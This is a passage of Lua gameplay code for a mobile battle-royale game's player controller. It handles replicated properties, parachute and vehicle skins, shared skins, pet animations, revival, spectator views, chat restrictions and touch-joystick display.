        local fatalDamageSys = SubsystemMgr:Get("FatalDamageSubsystem")
        if fatalDamageSys then fatalDamageSys:ClearPlayerKillerFlow(self.UID) end
    end
    
    require("GameLua.GameCore.Data.GameplayData").UnbindPlayerController(self.Object)
    if InputStateControl then
        InputStateControl.Destroy()
        InputStateControl = nil
    end
    
    self:ShowTouchInterface(false)
    self:ActivateTouchInterface(nil)
    PlayerControllerBase.__super.ReceiveEndPlay(self, endPlayReason)
end

function PlayerControllerBase:GetLifetimeReplicatedProps()
    local cond = import("ELifetimeCondition").COND_OwnerOnly
    local boolClass = UEnums.EPropertyClass.Bool
    local intClass = UEnums.EPropertyClass.Int
    return {
        {"bEnterpriseGMMod", cond, boolClass},
        {"bAvatarErrReport", cond, boolClass},
        {"_bIsTeammateExitTeamBeforeBoarding", cond, boolClass},
        {"nInLeftSharedSkinTimes", cond, intClass},
        {"nOutLeftSharedSkinTimes", cond, intClass},
        {"nFriendLeftSharedSkinTimes", cond, intClass},
        {"bForbidCustomChat", cond, boolClass}
    }
end

function PlayerControllerBase:CacheSyncParams()
    if bWriteLog then print("PlayerControllerBase:CacheSyncParams()") end
    if Client then return end
    
    if slua.isValid(self.PlayerState) then
        if not self.bReconnecting then
            if self.PlayerState.InitGeneralCounterFromServer then self.PlayerState:InitGeneralCounterFromServer() end
        elseif bWriteLog then
            print("PlayerControllerBase:CacheSyncParams, bReconnecting = " .. tostring(self.bReconnecting))
        end
    end
    
    local playerInfo = require("Server.Data.ServerPlayerDataMgr").GetPlayerInfo(self.UID)
    if playerInfo then
        local flag = playerInfo.suspicious_flag or 0
        if self.PlayerState and self.PlayerState.SetSuspiciousFlag then
            self.PlayerState:SetSuspiciousFlag(flag)
            if bWriteLog then print("PlayerControllerBase:CacheSyncParams ", flag, self.UID) end
        end
    elseif bWriteLog then
        print(" PlayerControllerBase:CacheSyncParams Invalid Player Info uid=", self.UID)
    end
end

function PlayerControllerBase:OnRep_bEnterpriseGMMod()
    EventSystem:postEvent(EVENTTYPE_INGAME, EVENTID_INGAME_ENTERPRISEGMMOD_CHANGE)
end

function PlayerControllerBase:IsEnterpriseGMMod()
    return self.bEnterpriseGMMod
end

function PlayerControllerBase:InitVehicleMusicIDs()
    local playerInfo = require("Server.Data.ServerPlayerDataMgr").GetPlayerInfo(self.UID)
    if not playerInfo then return end
    if bWriteLog then print("STExtraLuaPlayerControllerBase:InitVehicleMusicIDs UID: ", self.UID) end
    
    if playerInfo.car_music then
        local musicList = {}
        for _, musicId in pairs(playerInfo.car_music) do
            table.insert(musicList, {ItemTableID = musicId, Count = 1})
        end
        self.InitialVehicleMusicList = musicList
        self:InitVehicleMusicList()
        log_tree("STExtraLuaPlayerControllerBase:InitVehicleMusicIDs MusicList :", musicList)
    end
    
    if playerInfo.car_default_musics then
        self.DefaultVehicleMusic = playerInfo.car_default_musics
        log_tree("STExtraLuaPlayerControllerBase:InitVehicleMusicIDs DefaultMusic :", self.DefaultVehicleMusic)
    end
end

function PlayerControllerBase:GetCommercialVehicle()
    local res = {}
    local data = CDataTable.GetTableData("BetterVehicleEffect", self.ShowVehicleSkin)
    if data and data.BornFall == 1 then
        table.insert(res, self.ShowVehicleSkin)
    end
    return res
end

function PlayerControllerBase:GetParachutingVehicleInfo()
    local res = {}
    if self:UseGlideParachute() then
        local glideId = self:GetCurWearTwoPersonAircraftID()
        if bWriteLog then print("PlayerControllerBase:GetParachutingVehicleInfo RolewearIndex" .. tostring(self.RolewearIndex) .. "glideId" .. tostring(glideId)) end
        if glideId and glideId > 0 then
            local data = CDataTable.GetTableDataByFilter("TwoPersonAircraftConfig", "Glide", glideId)
            if data then table.insert(res, {data.ParachuteVehiclePath, data.VehicleSkinID}) end
        end
    else
        local data = CDataTable.GetTableData("BetterVehicleEffect", self.ShowVehicleSkin)
        if data and data.Parachute == 1 then table.insert(res, {data.ParachuteVehicle, self.ShowVehicleSkin}) end
    end
    log_tree("STExtraLuaPlayerControllerBase:GetParachutingVehicleInfo ", res)
    return res
end

function PlayerControllerBase:UseGlideParachute()
    if self.EnterFlyingNum and self.EnterFlyingNum > 1 and self:IsGlideAfterReviveDSSwitchEnabled() == false then
        return true
    end
    local playerInfo = require("Server.Data.ServerPlayerDataMgr").GetPlayerInfo(self.UID)
    if bWriteLog then print("PlayerControllerBase:UseGlideParachute", playerInfo) end
    if playerInfo and playerInfo.glide == true then
        if bWriteLog then print("PlayerControllerBase:UseGlideParachute", playerInfo.glide) end
        return true
    end
    
    local data = CDataTable.GetTableData("BetterVehicleEffect", self.ShowVehicleSkin)
    if data and data.Parachute == 1 then return true end
    
    local gameMode = import("GameplayStatics").GetGameMode(self)
    if slua.isValid(gameMode) and slua.isValid(gameMode.GameState) then
        local btData = CDataTable.GetTableData("BTMode", gameMode.GameState.GameModeID)
        if btData and btData.EnableParachutingVehicle == true then return true end
        if bWriteLog then print("CharacterBase:InitParachutingVehicle Table.EnableParachutingVehicle ~= true " .. tostring(gameMode.GameState.GameModeID)) end
        return true
    end
    return false
end

function PlayerControllerBase:IsGlideAfterReviveDSSwitchEnabled()
    if CGameState and (CGameState:GetGameModeState() == "FightingState" or CGameState:GetGameModeState() == "FinishedState") then
        local val = Game:GetDSSwitchValue(65)
        if bWriteLog then print("PlayerControllerBase:IsGlideAfterReviveDSSwitchEnabled, DSSwitch = " .. tostring(val)) end
        if val ~= "1" then return false end
    end
    return true
end

function PlayerControllerBase:OnPreBattleResult()
    if bWriteLog then print("STExtraLuaPlayerControllerBase.OnPreBattleResult") end
    self:FlushGameSettingFlow()
end

function PlayerControllerBase:FlushGameSettingFlow()
    if bWriteLog then print("STExtraLuaPlayerControllerBase.FlushGameSettingFlow") end
    local req = {UID = 0}
    if DataMgr and DataMgr.roleData then req.UID = DataMgr.roleData.uid end
    
    local basic = {}
    local hud = require("client.common.ui_util").GetFirstGameFrontendHUD()
    if hud then
        local settings = hud:GetUserSettings()
        if slua.isValid(settings) then
            basic.ShoulderEnable = settings.ShoulderEnable or false
            basic.ShoulderMode = settings.ShoulderMode or 1
        end
    end
    req.BasicSetting = basic
    log_tree("STExtraLuaPlayerControllerBase.FlushGameSettingFlow", req)
    require("ds_net").SendMessage("c2ds_ingame_flow_setting", req, req.UID)
end

function PlayerControllerBase:CallClientRPC() end
function PlayerControllerBase:RPCClientReceive() end
function PlayerControllerBase:CallDSRPC() end
function PlayerControllerBase:RPCDSReceive() end

function PlayerControllerBase:NotifyDeadBoxCollapsed(state)
    if bWriteLog then print("STExtraLuaPlayerControllerBase:NotifyDeadBoxCollapsed") end
    if state then EventSystem:postEvent(EVENTTYPE_DEADBOX_CLIENT, EVENTID_DEADBOX_OPENORCLOSEUI, false) end
end

function PlayerControllerBase:NotifyDeadBoxExpand()
    if bWriteLog then print("STExtraLuaPlayerControllerBase:NotifyDeadBoxExpand") end
    EventSystem:postEvent(EVENTTYPE_DEADBOX_CLIENT, EVENTID_DEADBOX_OPENORCLOSEUI, true)
end

function PlayerControllerBase:CanAutoSwitchGrenade(val)
    local can = val > 0 and import("BackpackUtils").CheckItemSubType(val, 601)
    if bWriteLog then print("STExtraLuaPlayerControllerBase:CanAutoSwitchGrenade", val, can) end
    return can
end

function PlayerControllerBase:RPC_Client_MarkShoot(a, b)
    if bWriteLog then print("STExtraLuaPlayerControllerBase:RPC_Client_MarkShoot", a, b) end
end

function PlayerControllerBase:RPC_Client_WonderfulPeriod(t, startT, endT, data, idx, score, isAi, subtypes)
    local req = {nType = t, nStartTime = startT, nEndTime = endT, uAdditionalData = data, nPeriodIndex = idx, nPeriodScore = score, bIsPureAI = isAi, SubTypeInfoList = subtypes}
    if bWriteLog then log_tree("STExtraLuaPlayerControllerBase:RPC_Client_WonderfulPeriod", req) end
    EventSystem:postEvent(EVENTTYPE_INGAME_REPLAY, EVENTID_PERIOD_UPDATE, req)
end

function PlayerControllerBase:RPC_Client_PostTGPAIS(a, b)
    if bWriteLog then print("PlayerControllerBase:RPC_Client_PostTGPAIS", a, b) end
    local helper = import("TApmHelper")
    if helper and helper.PostGameStatusToTGPAIS and a and b then helper.PostGameStatusToTGPAIS(a, b) end
end

function PlayerControllerBase:CanPickUpItem(item)
    if item.Type == 1 then
        local pawn = self:GetCurPawn()
        if slua.isValid(pawn) and pawn.GetWeaponManager and slua.isValid(pawn:GetWeaponManager()) then
            if not pawn:GetWeaponManager().bClientHasFinishedHandleSpawnWeapon then
                return import("EPickUpCheckResult").EPUFR_DelayAdd
            end
        end
    end
    return import("EPickUpCheckResult").EPUFR_OK
end

function PlayerControllerBase:DealWithPickUpFailed(item)
    if CGameMode and slua.isValid(CGameMode.PlayerRespawnComponent) then
        CGameMode.PlayerRespawnComponent:PlayerDelayAddItem(self.PlayerKey, item.TypeSpecificID)
    end
end

function PlayerControllerBase:OverrideAvatarInfo() end

function PlayerControllerBase:HandlePlayerEnterFighting()
    self:DestroyFlyDeviceAnimCache()
end

function PlayerControllerBase:DestroyFlyDeviceAnimCache()
    local safety = self:GetPlayerCharacterSafety()
    if slua.isValid(safety) and slua.isValid(safety:GetPlayerControllerSafety()) and import("/Script/ShadowTrackerExtra.GameLuaAPI").IsClassOf(safety:GetPlayerControllerSafety(), import("/Script/ShadowTrackerExtra.STExtraPlayerController")) then
        if bWriteLog then print("PlayerControllerBase:DestroyFlyDevivceAnimCache ") end
        safety:GetPlayerControllerSafety():SetParachuteAnimCached(2, false)
    elseif self:IsSpectator() then
        local pawn = self:GetCurPawn()
        if slua.isValid(pawn) and slua.isValid(pawn:GetPlayerControllerSafety()) and import("/Script/ShadowTrackerExtra.GameLuaAPI").IsClassOf(pawn:GetPlayerControllerSafety(), import("/Script/ShadowTrackerExtra.STExtraPlayerController")) then
            if bWriteLog then print("PlayerControllerBase: SpectatorPawn DestroyFlyDevivceAnimCache ") end
            pawn:GetPlayerControllerSafety():SetParachuteAnimCached(2, false)
        end
    end
end

function PlayerControllerBase:HandleOnPlayerKilledOthersPlayer(data)
    if bWriteLog then print("[tinghaohu]PlayerControllerBase:HandleOnPlayerKilledOthersPlayer. causerKey = " .. tostring(data.causerKey) .. ", victimKey = " .. tostring(data.victimKey)) end
    if data.causerKey == self.PlayerKey then
        self:GetHUD():PlayFatalDamageSound(data.ResultHealthStatus == 1, data.ResultHealthStatus == 2)
    end
    if data.Relationship == import("EFatalDamageRelationShip").MyTeamateIsCauser then
        local char = import("ScriptGameplayStatics").GetCharacterByPlayerKey(self, data.causerKey)
        if slua.isValid(char) and slua.isValid(char.CharacterAvatarComp2_BP) then
            char.CharacterAvatarComp2_BP:SetMeshVisibleByID(import("EAvatarSlotType").EAvatarSlotType_FootEffectEquipemtSlot, true, false, true)
        end
    end
end

function PlayerControllerBase:RPC_Client_MaliciousTeammateReceiveWarningTips()
    local mod = require("GameLua.Mod.BaseMod.Client.Security.ClientQuickReportMaliciousTeammate")
    if mod then mod.MaliciousTeammateReceiveWarningTips() end
end

function PlayerControllerBase:RPC_Client_MaliciousTeammateVictimReceiveTips(A1, A2, A3)
    local mod = require("GameLua.Mod.BaseMod.Client.Security.ClientQuickReportMaliciousTeammate")
    if mod then mod.MaliciousTeammateVictimReceiveTips(A1, A2, A3) end
end

function PlayerControllerBase:RPC_Client_PopupAFKWindow(A1, A2)
    local tools = require("GameLua.Mod.BaseMod.Common.UI.InGameTipsTools")
    if A2 then
        tools.HideAllMsgBox()
    elseif A1 then
        tools.HideAllMsgBox()
        tools.ShowMsgBox(1, LocUtil.GetLocalizeResStr(612401041), LocUtil.GetLocalizeResStr(612401042), function() end)
    else
        tools.HideAllMsgBox()
        tools.ShowMsgBox(1, LocUtil.GetLocalizeResStr(612401043), LocUtil.GetLocalizeResStr(612401044), function() end)
    end
end

function PlayerControllerBase:IsRevivalMode()
    if bWriteLog then print("revivaldebug PlayerControllerBase IsRevivalMode call") end
    if not self:TeammateCanRevival() then
        local ret = self.Super:IsRevivalMode()
        if bWriteLog then print("PlayerControllerBase IsRevivalMode IsRevivalMode:", ret) end
        return ret
    end
    return true
end

function PlayerControllerBase:TeammateCanRevival()
    if slua.isValid(self.PlayerState) and self.PlayerState.GetTeamMatePlayerStateList then
        for _, state in pairs(self.PlayerState:GetTeamMatePlayerStateList({}, false)) do
            if slua.isValid(state) then
                if state.GetRevivalCount and state:GetRevivalCount() > 0 then return true end
                if state.GetLeftBuyLifeCounts and state:GetLeftBuyLifeCounts() > 0 then return true end
            end
        end
    end
    return false
end

function PlayerControllerBase:CanBePickUpByItemID(item)
    if CGameState and slua.isValid(CGameState) and CGameState.ReviveState then
        if item.TypeSpecificID == CGameState.ReviveState:GetConfigSelfReviveItemId() then
            if CGameState.ReviveState:GetConfigItemLimitedTime() < CGameState:GetServerWorldTimeSeconds() then
                if bWriteLog then print("PlayerControllerBase:CanBePickUpByItemID, ItemLimitedTime = " .. tostring(CGameState.ReviveState:GetConfigItemLimitedTime()) .. ", PlayerKey = " .. tostring(self.PlayerKey)) end
                return false
            end
        end
    end
    if self.PlayerState and self.PlayerState.ReviveStateFeature and self.PlayerState.ReviveStateFeature:GetUseSinglePlayerReviveItem() == true then
        if bWriteLog then print("PlayerControllerBase:CanBePickUpByItemID, PlayerKey = " .. tostring(self.PlayerKey)) end
        return false
    end
    return self.Super:CanBePickUpByItemID(item)
end

function PlayerControllerBase:GetLastestViewPlayerKey()
    return self.LastestViewPlayerKey or 0
end

function PlayerControllerBase:HandlePlayerExitGame(reason)
    if self.PlayerState and slua.isValid(self.PlayerState) then
        local alive = self.PlayerState:IsAlive()
        if bWriteLog then print("PlayerControllerBase:HandlePlayerExitGame, PlayerKey = " .. tostring(self.PlayerState.PlayerKey) .. ", IsAlive = " .. tostring(alive)) end
        local counts = (self.PlayerState.GetRevivalCount and self.PlayerState:GetRevivalCount() or 0) + (self.PlayerState.GetLeftBuyLifeCounts and self.PlayerState:GetLeftBuyLifeCounts() or 0)
        
        if alive or counts > 0 then
            local dsAI = SubsystemMgr:Get("DSAITLogSubsystem")
            if dsAI and dsAI.HandlePlayerStateChanged then
                dsAI:HandlePlayerStateChanged(nil, nil, self.PlayerState.UID, reason, nil, alive, nil)
            end
        end
        if not alive then
            if self.PlayerState.SetRevivalCount and self.PlayerState:GetRevivalCount() > 0 then self.PlayerState:SetRevivalCount(0) end
            if self.PlayerState.SetLeftBuyLifeCounts and self.PlayerState:GetLeftBuyLifeCounts() > 0 then self.PlayerState:SetLeftBuyLifeCounts(0) end
            if self.PlayerState.IsInWaittingRevivalState ~= nil then self.PlayerState.IsInWaittingRevivalState = false end
            if self.PlayerState.bHasSendBattleResult == false then
                if bWriteLog then print("PlayerControllerBase:HandlePlayerExitGame, CheckSendBattleResult") end
                Game:CheckSendBattleResult(import("GameplayStatics").GetGameMode(self), self.PlayerState, false)
            end
        end
    elseif bWriteLog then
        print("PlayerControllerBase:HandlePlayerExitGame, uPlayerState = " .. tostring(self.PlayerState))
    end
end

function PlayerControllerBase:HandleSpectatorChange()
    local pawn = self:GetCurPlayerCharacter()
    if bWriteLog then print("PlayerControllerBase:HandleSpectatorChange uPlayerPawn", pawn) end
    if not self:HasAuthority() then
        if slua.isValid(pawn) and slua.isValid(pawn.ThirdPersonCameraComponent) then
            if bWriteLog then print("PlayerControllerBase:HandleSpectatorChange bAbsoluteLocation", pawn.ThirdPersonCameraComponent.bAbsoluteLocation) end
            if pawn.ThirdPersonCameraComponent.bAbsoluteLocation then
                if pawn.ApplyAllCompOptimizationByVision then pawn:ApplyAllCompOptimizationByVision(false) end
                pawn.ThirdPersonCameraComponent.bAbsoluteLocation = false
                pawn.ThirdPersonCameraComponent.bAbsoluteRotation = false
                pawn.ThirdPersonCameraComponent.bAbsoluteScale = false
            end
        end
        return
    end
    
    if slua.isValid(pawn) then
        self.LastestViewPlayerKey = pawn.PlayerKey or 0
        local parent = pawn:GetAttachParentActor()
        if bWriteLog then print("PlayerControllerBase:HandleSpectatorChange", pawn, parent, "DefaultLuaEventPlaceholder", self.ThePlane) end
        if slua.isValid(parent) and Game:IsClassOf(parent, "DefaultLuaEventPlaceholder") and self.ThePlane ~= parent then
            self.ThePlane = self.Object
            self:OnRep_Plane()
        end
    end
end

function PlayerControllerBase:MarkTeammateExitTeamBeforeBoarding()
    if not Client then self._bIsTeammateExitTeamBeforeBoarding = true end
end

function PlayerControllerBase:IsTeammateExitTeamBeforeBoarding()
    return self._bIsTeammateExitTeamBeforeBoarding
end

function PlayerControllerBase:SwitchToTeammate(idx)
    if bWriteLog then print("PlayerControllerBase:SwitchToTeammate", idx) end
    self:HandleSwitchToPlayerIndex(idx)
end

function PlayerControllerBase:SwitchFreeViewInOB()
    if bWriteLog then print("PlayerControllerBase:SwitchFreeViewInOB1", self:IsObserver(), self:IsDemoPlayGlobalObserver()) end
    if self:IsObserver() or self:IsDemoPlayGlobalObserver() then
        if bWriteLog then print("PlayerControllerBase:SwitchFreeViewInOB2") end
        self:HandleEnterFreeViewInOB()
    end
end

function PlayerControllerBase:RPC_Server_ReqUseShareSkin()
    if bWriteLog then print(" PlayerControllerBase:RPC_Server_ReqUseShareSkin") end
    if self.nInLeftSharedSkinTimes > 0 then
        if self.nFriendLeftSharedSkinTimes > 0 then
            self:RPC_Client_NotifyUseShareSkin(0)
        else
            self:RPC_Client_NotifyUseShareSkin(2)
        end
    else
        self:RPC_Client_NotifyUseShareSkin(1)
    end
end

function PlayerControllerBase:RPC_Server_RealUseShareSkin()
    if bWriteLog then print(" PlayerControllerBase:RPC_Server_ReqUseShareSkin") end
    local mgr = require("Server.Data.ServerPlayerDataMgr")
    if mgr then
        local info = mgr.GetPlayerInfo(self.UID)
        log_tree(" PlayerControllerBase:RPC_Server_RealUseShareSkin playerInfo.share_wear", info.share_wear)
        if info and info.share_wear and info.share_wear.friend_uid ~= 0 then
            if self.nInLeftSharedSkinTimes > 0 and self.nFriendLeftSharedSkinTimes > 0 then
                self.nInLeftSharedSkinTimes = self.nInLeftSharedSkinTimes - 1
                self.nFriendLeftSharedSkinTimes = self.nFriendLeftSharedSkinTimes - 1
                local friendPC = Game:GetPlayerControllerByUID(info.share_wear.friend_uid)
                if Game:IsValid(friendPC) then
                    friendPC.nOutLeftSharedSkinTimes = friendPC.nOutLeftSharedSkinTimes - 1
                elseif bWriteLog then
                    print(" PlayerControllerBase:RPC_Server_ReqUseShareSkin invalid uTargetPlayerController")
                end
            elseif bWriteLog then
                print(" PlayerControllerBase:RPC_Server_RealUseShareSkin unexpect cond 1. uid:" .. self.UID)
            end
            return
        end
    end
    if bWriteLog then print(" PlayerControllerBase:RPC_Server_RealUseShareSkin unexpect cond 2. uid:" .. self.UID) end
end

function PlayerControllerBase:RPC_Client_NotifyUseShareSkin(reason)
    if bWriteLog then print(string.format(" PlayerControllerBase:RPC_Client_NotifyUseShareSkin Reason:%s", reason)) end
    EventSystem:postEvent(EVENTTYPE_INGAME_BACKPACK, EVENTID_BACKPACK_NOTIFY_USE_SHARESKIN, reason)
end

function PlayerControllerBase:OnRep_nFriendLeftSharedSkinTimes()
    if bWriteLog then print(string.format(" PlayerControllerBase:OnRep_nFriendLeftSharedSkinTimes :%s", self.nFriendLeftSharedSkinTimes)) end
    EventSystem:postEvent(EVENTTYPE_INGAME_BACKPACK, EVENTID_BACKPACK_INGAME_REFRESH_LEFT_TIMES)
end

function PlayerControllerBase:UseSharedBagSkin()
    local left = self.nInLeftSharedSkinTimes > 0
    if bWriteLog then print(" PlayerControllerBase:UseSharedBagSkin cond:" .. tostring(left)) end
    if left then self.Super:UseSharedBagSkin() end
    return left
end

function PlayerControllerBase:TriggerInputAction(action)
    local wowDef = require("GameLua.Mod.CreativeBase.Gameplay.Subsystem.WoWEditor.WoWEditorDefine")
    if IsWoWEditor and not wowDef.InputKeyWhiteList[action.KeyName] then return end
    if IsWoWEditor and action.KeyName == "SpaceBar" then
        local editSys = SubsystemMgr:Get("CreativeModeEditBuildSubSystem")
        if editSys and editSys:IsFreeViewMode() then return end
    end
    if InputStateControl then InputStateControl.CallInputAction(action) end
    if not Client.IsWindowOB() and Client.IsWindows() then
        EventSystem:postEvent(EVENTTYPE_PCOB, EVENTID_PCOB_INPUT_KEY, action)
    end
end

function PlayerControllerBase:HandleShowFollowEmoteUI(show)
    if self.bIsShowingFollowEmoteUI == show then return end
    self.bIsShowingFollowEmoteUI = show
    if bWriteLog then print("PlayerControllerBase HandleShowFollowEmoteUI", show) end
    EventSystem:postEvent(EVENTTYPE_INGAME_BASIC_SKILL_MENU_BP, show and EVENTID_SHOW_NORMAL_BTN or EVENTID_HIDE_NORMAL_BTN, "Type_FollowEmote")
end

function PlayerControllerBase:HandleTouchInterfaceChanged()
    self:BindVirtualJoystickInputDelegates(true)
    self:BindVirtualJoystickTouchedStartInAreaDelegates(true)
end

function PlayerControllerBase:HandleOnSetPlane(plane)
    if Client then return end
    if bWriteLog then print("PlayerControllerBase:HandleOnSetPlane", plane, self.PlayerKey) end
    if slua.isValid(self.SpectatorComponent) and self.SpectatorComponent.GetOwnerObservers and not self:IsSpectator() then
        local obs = self.SpectatorComponent:GetOwnerObservers()
        if obs then
            for _, ob in pairs(obs) do
                if ob and not ob:IsSpectator() and not ob:IsInPetSpectator() and ob.ThePlane ~= plane then
                    if bWriteLog then print("PlayerControllerBase:HandleOnSetPlane ObController:", ob.PlayerKey) end
                    ob:SetCanGotoExPlane(true)
                    ob:SetPlane(plane)
                    ob:SetCanGotoExPlane(false)
                end
            end
        end
    end
end

function PlayerControllerBase:HandleOnPlayerExitFlying()
    if Client then return end
    local safety = self:GetPlayerCharacterSafety()
    if bWriteLog then print("PlayerControllerBase:HandleOnPlayerExitFlying", self.PlayerKey, safety) end
    if not slua.isValid(safety) then return end
    if slua.isValid(self.SpectatorComponent) and self.SpectatorComponent.GetOwnerObservers and not self:IsSpectator() then
        local obs = self.SpectatorComponent:GetOwnerObservers()
        if obs then
            for _, ob in pairs(obs) do
                if ob and ob:IsSpectator() then
                    if bWriteLog then print("PlayerControllerBase:HandleOnPlayerExitFlying ObController:", ob.PlayerKey) end
                    ob:SetViewTargetTest(safety)
                end
            end
        end
    end
end

function PlayerControllerBase:HandleShowMovableEmoteUI(show)
    if self.bIsShowingMovableEmoteUI == show then return end
    self.bIsShowingMovableEmoteUI = show
    if bWriteLog then print("PlayerControllerBase HandleShowMovableEmoteUI", show) end
end

function PlayerControllerBase:PlaySpecifiedPetAnimation(id, length, hasMaster)
    if not Client then return end
    local data = CDataTable.GetTableData("PetActionTable", id)
    local masterSkill = (data and data.MasterSkillID and data.MasterSkillID > 0) and data.MasterSkillID or 0
    local pawn = self:GetCurPawn()
    if slua.isValid(pawn) and slua.isValid(pawn.PetComponent_BP) and slua.isValid(pawn.PetComponent_BP.PetPawn) then
        local target = hasMaster and pawn.PetComponent_BP:GetMiniTVPawn() or pawn.PetComponent_BP.PetPawn
        if slua.isValid(target) and target.bHidden then
            if bWriteLog then print("PlayerControllerBase:PlaySpecifiedPetAnimation Pet Hidden not allow to play") end
            ShowNotice(target.bInPetExhibiting and 82159 or 66661)
            return
        end
        if masterSkill > 0 and pawn.PetComponent_BP.PlaySpecifiedPetAnimationCheck and not pawn.PetComponent_BP:PlaySpecifiedPetAnimationCheck(pawn) then return end
    end
    if data and data.PetAnimRes then
        require("client.slua_ui_framework.util").GetAssetAsync(data.PetAnimRes, function(obj)
            if slua.isValid(obj) then
                self:RPC_Server_PlaySpecifiedPetAnimation(id, obj.SequenceLength, masterSkill, hasMaster or false)
            end
        end)
    end
end

function PlayerControllerBase:RPC_Server_PlaySpecifiedPetAnimation(id, length, masterSkill, hasMaster)
    local pawn = self:GetCurPawn()
    if slua.isValid(pawn) and slua.isValid(pawn.PetComponent_BP) and id and length and length > 0 then
        if bWriteLog then print("PlayerControllerBase:RPC_Server_PlaySpecifiedPetAnimation nAnimationID = " .. id .. "AnimationLength" .. length .. "MasterSkillID:" .. tostring(masterSkill)) end
        local data = CDataTable.GetTableData("PetActionTable", id)
        if data and data.CanPlayInBattle ~= 0 and data.CanPlayInBattle ~= 3 then
            if bWriteLog then print("PlayerControllerBase:RPC_Server_PlaySpecifiedPetAnimation not allow to play") end
            return
        end
        local target = hasMaster and pawn.PetComponent_BP:GetMiniTVPawn() or pawn.PetComponent_BP.PetPawn
        if slua.isValid(target) then
            if not target:CanPlay() or target.bHidden then return end
            if target:PetHasState(import("EPetState").PetPlayingFeature) then return end
            local isLocked = function(actionId, isCommercial)
                if not isCommercial then
                    local levelData = CDataTable.GetTableData("PetLevelTable", target.PetLevelInfo.PetId * 10000 + target.PetLevelInfo.PetLevel)
                    local actions = require("common.string_util").Split(levelData.AllAction, "|")
                    if actions and #actions > 0 then
                        for _, a in pairs(actions) do if actionId == tonumber(a) then return true end end
                    end
                elseif self.CommerFeature and self.CommerFeature.MiniTVActionIDList then
                    for _, a in pairs(self.CommerFeature.MiniTVActionIDList) do if actionId == tonumber(a) then return true end end
                end
                return false
            end
            if not isLocked(id, hasMaster) then
                if bWriteLog then print("PlayerControllerBase:RPC_Server_PlaySpecifiedPetAnimation is locked") end
                return
            end
            if target.BeforePlayAction then target:BeforePlayAction(id) end
            if masterSkill and masterSkill > 0 then
                local mgr = pawn:GetSkillManager()
                if slua.isValid(mgr) then
                    local skill = mgr:GetSkill(masterSkill)
                    if skill and skill:IsCDOK(mgr, -1) then pawn:TriggerEntrySkillWithID(masterSkill, true) end
                end
                target:PlayPetInteractAnimation(pawn, id, length)
            else
                target:PlayPetAnimation(id, length)
            end
        end
    end
end

function PlayerControllerBase:RPC_Server_SetGameReadyCountDown(val)
    if bWriteLog then print("PlayerControllerBase:RPC_Server_SetGameReadyCountDown", val, slua.isValid(CGameMode), slua.isValid(CGameState)) end
    if not Client and slua.isValid(CGameMode) and slua.isValid(CGameState) and val then
        if bWriteLog then print("PlayerControllerBase:RPC_Server_SetGameReadyCountDown IsObserver", self:IsObserver(), self.bRoomOwner, CGameMode.RoomType) end
        if self:IsObserver() and self.bRoomOwner and CGameMode.RoomType == "match" then
            local state = CGameState:GetGameModeState() or ""
            if bWriteLog then print("PlayerControllerBase:RPC_Server_SetGameReadyCountDown GameModeState", state) end
            if state == "ReadyState" then
                CGameState.MatchReadyConfirmed = true
                CGameMode:SetStateLeftTime(val)
            end
        end
    end
end

function PlayerControllerBase:BecomeAGhost(val)
    self.Super:BecomeAGhost(val)
    if self:IsGhost() then
        if self.DisableNetUpdateGroupID then self:DisableNetUpdateGroupID(1)
        elseif bWriteLog then print("PlayerControllerBase:BecomeAGhost, have no DisableNetUpdateGroupID function") end
    else
        if self.EnableNetUpdateGroupID then self:EnableNetUpdateGroupID(1)
        elseif bWriteLog then print("PlayerControllerBase:BecomeAGhost, have no EnableNetUpdateGroupID function") end
    end
end

function PlayerControllerBase:OnRep__bIsTeammateExitTeamBeforeBoarding()
    if bWriteLog then print("PlayerControllerBase:OnRep__bIsTeammateExitTeamBeforeBoarding ", self._bIsTeammateExitTeamBeforeBoarding) end
    if self._bIsTeammateExitTeamBeforeBoarding then
        local ui = UIManager.GetUI(UIManager.UI_Config_InGame.BirthIslandTips)
        if ui and ui.ShowEscapeNotice then
            ui:ShowEscapeNotice()
            if bWriteLog then print("PlayerControllerBase:OnRep__bIsTeammateExitTeamBeforeBoarding ShowEscapeNotice") end
        end
    end
end

function PlayerControllerBase:PerRespawnClearOtherPawn()
    if slua.isValid(self:GetPetSpectatorComp()) then
        if bWriteLog then print("PlayerControllerBase:RecoverWaitingRespawnPawn") end
        self:GetPetSpectatorComp():PerRespawnClearOtherPawn()
    end
end

function PlayerControllerBase:CheckCanCustomChat()
    local state = require("GameLua.GameCore.Data.GameplayData").GetGameState()
    if state and state:GetDSSwitchValueFastWithCache(62) == "1" then
        if not Client and CGameMode and CGameMode.RoomType == "match" then
            if bWriteLog then print("ChatComponent:ReceiveBeginPlay Is MatchRoom") end
            self.bForbidCustomChat = true
        end
        if not Client then
            local config = require("GameLua.GameCore.Main.GameMainConfig")
            if config.IsPeakGame() then
                if bWriteLog then print("ChatComponent:ReceiveBeginPlay IsPeakGame") end
                self.bForbidCustomChat = false
            end
            if config.IsNationEsports() then
                if bWriteLog then print("ChatComponent:ReceiveBeginPlay IsNationEsports") end
                self.bForbidCustomChat = true
            end
        end
    end
    if Server and Server.IsMatchVersion and Server.IsMatchVersion() then
        if bWriteLog then print("PlayerControllerBase:CheckCanCustomChat IsMatchVersion") end
        self.bForbidCustomChat = true
    end
end

function PlayerControllerBase:LuaShowJoystickWidgetWithTag(tag)
    self:ShowJoystickWidgetWithTag(tag)
end

function PlayerControllerBase:LuaHideJoystickWidgetWithTag(tag)
    self:ActivateTouchInterface(nil)
    self:HideJoystickWidgetWithTag(tag)
end

function PlayerControllerBase:LuaShowJoystickWithTag(tag)
    self:ShowJoystickWithTag(tag)
end

function PlayerControllerBase:LuaHideJoystickWithTag(tag)
    self:HideJoystickWithTag(tag)
end

function PlayerControllerBase:SetAlwaysHideTouchInterface(hide)
    if hide then self:LuaHideJoystickWidgetWithTag("AlwaysHideTouchInterface")
    else self:LuaShowJoystickWidgetWithTag("AlwaysHideTouchInterface") end
end

function PlayerControllerBase:LuaShouldShowTouchInterface(val) return val end

function PlayerControllerBase:NotCanShowTouchInterfaceHandle() return false end

function PlayerControllerBase:PreShowTouchInterfaceCheck(val) return 0 end

function PlayerControllerBase:ShowTouchInterface(show, reason)
    if bWriteLog then print(string.format("PlayerControllerBase:ShowTouchInterface %s (reason = %s)", show, reason)) end
    local shouldShow = self:LuaShouldShowTouchInterface(show)
    if self.bIsJoyStickShow == shouldShow then return end
    self.bIsJoyStickShow = shouldShow
    if shouldShow then
        self:LuaShowJoystickWithTag("OutDatedMethodTag")
    else
        self:LuaHideJoystickWithTag("OutDatedMethodTag")
    end
end

